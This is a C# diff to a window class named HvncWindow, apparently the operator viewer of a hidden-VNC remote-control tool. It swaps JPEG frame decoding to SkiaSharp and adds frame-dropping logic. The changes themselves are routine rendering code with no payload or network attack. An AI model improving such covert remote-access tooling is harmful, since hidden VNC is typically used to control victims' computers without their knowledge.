@@ -4,7 +4,10 @@ using System.Windows;
 using System.Windows.Controls.Primitives;
 using System.Windows.Input;
 using System.Windows.Media.Animation;
+using System.Windows.Media;
 using System.Windows.Media.Imaging;
+using SkiaSharp;
+using System.Runtime.InteropServices;
 using DevExpress.Xpf.Core;
 using SeroServer.Net;
 using SeroServer.Protocol;
@@ -24,6 +27,8 @@ public partial class HvncWindow : ThemedWindow
     private DateTime _fpsTime = DateTime.UtcNow;
     private long _lastMoveMs;
     private bool _ctrlDown;
+    private volatile bool _renderBusy;
+    private WriteableBitmap? _wb;
 
     // Canvas dimensions reported by last frame
     private int _remoteW = 1280;
@@ -245,22 +250,41 @@ public partial class HvncWindow : ThemedWindow
             _remoteW = frame.W > 0 ? frame.W : _remoteW;
             _remoteH = frame.H > 0 ? frame.H : _remoteH;
 
+            if (_renderBusy) { SendAck(); return; }
+            _renderBusy = true;
+            var jpegBytes = Convert.FromBase64String(frame.J);
             Task.Run(() =>
             {
                 try
                 {
-                    var bytes = Convert.FromBase64String(frame.J);
-                    using var ms = new MemoryStream(bytes);
-                    var bi = new BitmapImage();
-                    bi.BeginInit();
-                    bi.StreamSource = ms;
-                    bi.CacheOption = BitmapCacheOption.OnLoad;
-                    bi.EndInit();
-                    bi.Freeze();
-                    if (!_closed)
-                        Dispatcher.BeginInvoke(() => ShowFrame(bi));
+                    var jpHandle = GCHandle.Alloc(jpegBytes, GCHandleType.Pinned);
+                    byte[]? pixels = null;
+                    int w = 0, h = 0, stride = 0;
+                    try
+                    {
+                        using var skData = SKData.Create(jpHandle.AddrOfPinnedObject(), jpegBytes.Length);
+                        using var codec  = SKCodec.Create(skData);
+                        if (codec != null)
+                        {
+                            w = codec.Info.Width; h = codec.Info.Height; stride = w * 4;
+                            pixels = new byte[stride * h];
+                            var pxHandle = GCHandle.Alloc(pixels, GCHandleType.Pinned);
+                            try
+                            {
+                                var info = new SKImageInfo(w, h, SKColorType.Bgra8888, SKAlphaType.Opaque);
+                                if (codec.GetPixels(info, pxHandle.AddrOfPinnedObject()) != SKCodecResult.Success)
+                                    pixels = null;
+                            }
+                            finally { pxHandle.Free(); }
+                        }
+                    }
+                    finally { jpHandle.Free(); }
+
+                    if (pixels == null || _closed) { _renderBusy = false; SendAck(); return; }
+                    int cw = w, ch = h, cs = stride;
+                    Dispatcher.BeginInvoke(() => ShowFrame(pixels, cw, ch, cs));
                 }
-                catch { SendAck(); }
+                catch { _renderBusy = false; SendAck(); }
             });
         }
         catch { SendAck(); }
@@ -292,11 +316,22 @@ public partial class HvncWindow : ThemedWindow
         catch { }
     }
 
-    private void ShowFrame(BitmapImage bi)
+    private void ShowFrame(byte[] pixels, int w, int h, int stride)
     {
-        if (_closed) return;
-        ImgFrame.Source = bi;
-        TxtPlaceholder.Visibility = Visibility.Collapsed;
+        if (_closed) { _renderBusy = false; return; }
+        try
+        {
+            if (_wb == null || _wb.PixelWidth != w || _wb.PixelHeight != h)
+            {
+                _wb = new WriteableBitmap(w, h, 96, 96, PixelFormats.Bgra32, null);
+                ImgFrame.Source = _wb;
+            }
+            _wb.Lock();
+            _wb.WritePixels(new Int32Rect(0, 0, w, h), pixels, stride, 0);
+            _wb.Unlock();
+            TxtPlaceholder.Visibility = Visibility.Collapsed;
+        }
+        finally { _renderBusy = false; }
 
         _frameCount++;
         var now = DateTime.UtcNow;
